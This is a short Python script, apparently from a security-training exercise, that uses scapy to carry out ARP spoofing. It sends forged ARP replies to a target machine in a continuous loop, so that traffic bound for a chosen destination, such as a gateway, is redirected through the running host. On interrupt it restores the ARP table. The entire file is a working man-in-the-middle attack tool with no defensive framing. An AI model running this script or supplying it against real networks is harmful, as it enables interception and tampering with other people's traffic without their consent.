#!/usr/bin/python3
import time
import scapy.all as scapy
import argparse
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Enter the target machine IP.")
    parser.add_argument("-d", "--dest", dest="destination", help="Enter the destination IP.")
    return parser.parse_args()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Make sure we include the Ethernet destination MAC address
    ether = scapy.Ether(dst=target_mac)
    packet = ether / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(spoof_ip)
    # Make sure we include the Ethernet destination MAC address
    ether = scapy.Ether(dst=target_mac)
    packet = ether / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False)

args = get_arguments()
target_ip = args.target
spoof_ip = args.destination
packet_count = 0

try:
    while True:
        spoof(target_ip, spoof_ip)
        packet_count += 1
        print(f"\r[+] Packet Sent: {packet_count}", end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Stopping spoofer .... restoring arp table back to default.\n")
    restore(target_ip, spoof_ip)
